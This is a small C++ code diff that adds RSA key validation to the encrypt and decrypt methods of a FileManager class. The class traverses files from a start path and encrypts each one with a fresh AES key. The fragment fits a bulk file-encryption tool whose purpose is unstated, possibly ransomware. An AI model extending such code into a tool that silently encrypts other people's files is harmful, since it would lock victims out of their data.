@@ -86,7 +86,7 @@ void FileManager::TransformFiles(const std::string& startPath, void (FileManager
 }
 
 void FileManager::EncryptContents(File& file) {
-    if ( !this->m_EncryptionKeys.pub )
+    if ( !this->m_EncryptionKeys.pub || RSA_check_key(this->m_EncryptionKeys.pub) != 1 )
         return;
 
     BYTESTRING AESKey          = LGCrypto::Generate256AESKey();
@@ -103,7 +103,7 @@ void FileManager::EncryptContents(File& file) {
 }
 
 void FileManager::DecryptContents(File& file) {
-    if ( !this->m_EncryptionKeys.priv )
+    if ( !this->m_EncryptionKeys.priv || RSA_check_key(this->m_EncryptionKeys.priv) != 1 )
         return;
 
     BYTESTRING cipherText = Serialization::SerializeString(file.ReadFrom());
